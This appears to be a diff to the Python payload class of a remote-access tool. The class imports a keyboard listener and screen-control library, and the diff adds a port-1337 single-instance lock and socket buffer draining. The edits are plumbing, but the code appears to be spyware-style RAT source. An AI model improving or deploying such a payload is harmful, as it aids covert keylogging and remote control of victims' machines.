@@ -8,12 +8,14 @@ import collections
 import os
 import shutil
 import requests
-import hashlib
+import socket
 from pynput.keyboard import Listener
 import pyautogui
 
 class Payload():
     def __init__(self, host='0.0.0.0', port=1337, **kwargs):
+        self.single = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.single.bind(("127.0.0.1", 1337))
         self.handlers = {}
         self.child_procs = {}
         self.owner = kwargs.get('owner')
@@ -233,6 +235,14 @@ class Payload():
             msg_size = struct.unpack('!L', header)[0]
             msg = self.connection.recv(msg_size)
             data = msg.decode('utf-8')
+            self.connection.settimeout(0.2)  
+            try:
+                while True:
+                    self.connection.recv(4096) 
+            except socket.timeout:
+                pass 
+            finally:
+                self.connection.settimeout(None)
             return json.loads(data)
         except Exception as e:
             log(f"{self.recv_task.__name__}: {str(e)}", level='error') 
